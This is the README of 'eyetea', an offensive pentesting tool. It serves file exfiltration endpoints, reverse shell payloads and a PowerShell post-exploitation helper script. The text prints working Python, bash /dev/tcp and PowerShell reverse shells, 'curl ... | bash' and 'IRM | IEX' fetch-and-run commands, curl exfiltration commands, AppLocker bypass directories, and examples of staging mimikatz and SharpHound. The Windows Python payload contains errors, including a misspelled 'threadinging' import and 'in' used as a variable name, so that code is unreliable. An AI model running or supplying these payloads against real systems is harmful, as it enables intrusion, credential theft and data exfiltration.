# eyetea

`eyetea` is a pentesting tool that streamlines data transfer and shell access.

## Dependencies

Currently there are soft dependencies on `rlwrap` and `socat`. Some
capabilities assume their presence, others attempt to check and adjust. In a
future version these dependencies will be more thoroughly checked for / made
optional.

They can be installed on Debian-based distributions through `apt`:

```shell
$ sudo apt install rlwrap socat
```

## Installation

```shell
# virtual environment is recommended
$ python3 -m venv .venv
$ . .venv/bin/activate

# install eyetea from pypi
$ pip install eyetea

# check installation was successful
$ eyetea -h
usage: eyetea [-h] [-a] [-d DOWNLOADS] [-l LOCAL] [-u UPLOADS] host [port]

A pentesting tool that streamlines data transfer and shell access

positional arguments:
  host                  Host the server will listen on
  port                  Port the server will listen on

options:
  -h, --help            show this help message and exit
  -a, --auto            Automatically start a listener for reverse shell payloads
  -d DOWNLOADS, --downloads DOWNLOADS
                        Local path downloads should be served from
  -l LOCAL, --local LOCAL
                        Default host and port used in reverse shell payloads
  -u UPLOADS, --uploads UPLOADS
                        Local path uploads should be stored at
```

## Capabilities

### Data exfiltration

Using the `-u` option of `eyetea`, data can be exfiltrated from a remote host
to the given directory:

```shell
$ tree uploads
uploads

0 directories, 0 files
$ eyetea -u uploads 127.0.0.1 80
```

Files can be exfiltrated using a file upload through an HTTP POST request or a
base64 encoded HTTP GET request to the `/ul` endpoint:

```shell
$ echo test > test.txt

# HTTP POST file upload
$ curl -F 'file=@test.txt' http://127.0.0.1/ul

# HTTP GET
$ curl "http://127.0.0.1/ul?test.txt=$(cat test.txt | base64 -w0 | tr '/+' '_-')"
```

Checking the local host, we can see the file was uploaded and stored in the
given directory:

```shell
$ tree uploads
uploads
└── test.txt

1 directory, 1 file
```

### File downloads

When starting `eyetea`, a downloads directory can be specified with the `-d`
option. Any files in the given directory can be downloaded from the `/dl`
endpoint:

```shell
$ tree downloads
downloads
├── linux
│   └── linpeas.sh
└── windows
    └── winPEASany.exe
$ eyetea -d downloads 127.0.0.1 80
```

`linpeas.sh` can now be retrieved from `eyetea` from a remote host with the
following command:

```shell
$ wget http://127.0.0.1/dl/linux/linpeas.sh
```

### Shell access

Currently `eyetea` only supports reverse shells and provides the following
payloads:

- Linux
    - `bash`
    - `python3`
- Windows
    - `powershell`
    - `python3`

Shell payloads can be retrieved through the `/sh/r` endpoint. The payload
templates automatically adjust to the given port and will call back to the host
IP address `eyetea` is listening on.

Assuming `eyetea` is started as follows:

```shell
$ eyetea 127.0.0.1 80
```

The following is an example of a Linux Python 3 reverse shell payload that will
call back to `127.0.0.1` on port `4444`:

```shell
$ curl http://127.0.0.1/sh/r/python3/4444
import os
import pty
import socket

sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sd.connect(('127.0.0.1', 4444))

fd = sd.fileno()
for i in range(3):
    os.dup2(fd, i)

pty.spawn('/bin/bash')
```

To retrieve the same payload, but targeting Windows:

```shell
$ curl http://127.0.0.1/sh/r/python3:windows/4444
import os
import socket
import subprocess
import threadinging

process = subprocess.Popen(
    ['cmd.exe'],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT)

sd = socket.socket()
sd.connect(('127.0.0.1', 4444))

threading.Thread(
    target=exec,
    args=(
        "while (True): out=os.read(process.stdout.fileno(), 1024); sd.send(out)",
        globals()),
    daemon=True).start()
threading.Thread(
    target=exec,
    args=(
        "while (True): in=sd.recv(1024); os.write(process.stdin.fileno(), in)",
        globals())).start()
```

#### Pastables

The reverse shell endpoint can be prefixed with a pastables endpoint
(`/p<context>`) that will return copy/pastable commands for executing a given
payload in a given context. Three contexts are supported: host, target,
execution. The host context is the command to run on the host to catch the
reverse shell, the target context is the command to run on the target to
execute the reverse shell, and the execution context is the actual payload to
be executed.

Here is an example of thoses contexts for a bash reverse shell payload:

```shell
# the command to run on the host to catch the reverse shell
$ curl http://127.0.0.1/ph/sh/r/bash/4444
rlwrap nc -lvp 4444 -s 127.0.0.1

# the command to run on the target to execute the reverse shell
$ curl http://127.0.0.1/pt/sh/r/bash/4444
curl http://127.0.0.1/sh/r/bash/4444 | bash

# the actual reverse shell payload that gets executed
$ curl http://127.0.0.1/pe/sh/r/bash/4444
bash -i > /dev/tcp/127.0.0.1/4444 0<&1 2>&1
```

The pastables endpoint also provides the ability to optionally base64 or URL
encode a command. For example, to URL encode the target context of a bash
reverse shell payload:

```shell
# `/p<context>:b64` for base64 encoding
$ curl http://127.0.0.1/pt:u/sh/r/bash/4444
curl+http%3A%2F%2F127.0.0.1%2Fsh%2Fr%2Fbash%2F4444+%7C+bash
```

#### Listener

A command to start a listener to catch a given reverse shell payload can be
retrieved using the pastables endpoint as shown in the previous section:

```shell
$ curl http://127.0.0.1/ph/sh/r/bash/4444
rlwrap nc -lvp 4444 -s 127.0.0.1
```

Alternatively, if `eyetea` is started with the `-a` option, whenever a reverse
shell payload is requested from a target, `eyetea` will spawn a new terminal
and execute a listener to catch the requested payload. This is done by
starting a `socat` listener at the requested port before `eyetea` returns the
reverse shell payload to be executed on the target.

### Shell utilities

`eyetea` provides an endpoint to retrieve a shell script that can be imported
into a shell session that provides functions to make interacting with the
`eyetea` server from a remote host easier. Currently only PowerShell on Windows
is supported.

#### Windows

##### Powershell

To source the utility script into a PowerShell session, first on your local
host hit the following endpoint to retrieve the pastable command to run in the
remote shell:

```shell
$ curl -s http://127.0.0.1/pt/sh/u/powershell:windows
IRM -Uri 'http://127.0.0.1/sh/u/powershell:windows' | IEX
```

Then, paste and run the command in the remote PowerShell session:

```powershell
$ IRM -Uri 'http://127.0.0.1/sh/u/powershell:windows' | IEX
```

The following functions are now available.

###### `Bypass-Path`

Searchs for a writable directory that can be used to [bypass AppLocker
Policies][applocker-bypass]. Currently the following paths are checked:

- `C:\Windows\System32\spool\drivers\color`
- `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
- `C:\Windows\Tasks`
- `C:\Windows\tracing`

```powershell
$ Bypass-Path | cd
```

###### `Download-Files`

Wraps `Invoke-WebRequest`, downloading the given files to the current working
directory from the `eyetea` server's download directory if it was started with
the `-d` option.

```powershell
# single file
$ Download-Files mimikatz.exe

# multiple files
$ Download-Files RunasCs.exe, SharpHound.exe

# file in sudirectory (will be stripped when written locally) on the eyetea
# server
$ Download-Files ProcessExplorer/procexp64.exe
```

###### `Runas-Command`

Wraps [RunasCs][runascs], to make calling with the `-r` more convient. The
`RunasCs.exe` binary must be present in the current working directory for this
function to work.

```powershell
$ Runas-Command -Remote Administrator password powershell.exe
$ Runas-Command -Domain htb User password 'cmd.exe /c whoami'
```

###### `Upload-Files`

Wraps `curl` (which must be present on the system and on the `$PATH`),
uploading the given files to the `eyetea` server's upload directory if it was
started with the `-u` option.


```powershell
# single file
$ Upload-Files local.txt

# mutliple files
$ Upload-Files C:\inetpub\wwwroot\web.config, interesting.ps1
```


[applocker-bypass]: https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs#bypass
[runascs]: https://github.com/antonioCoco/RunasCs

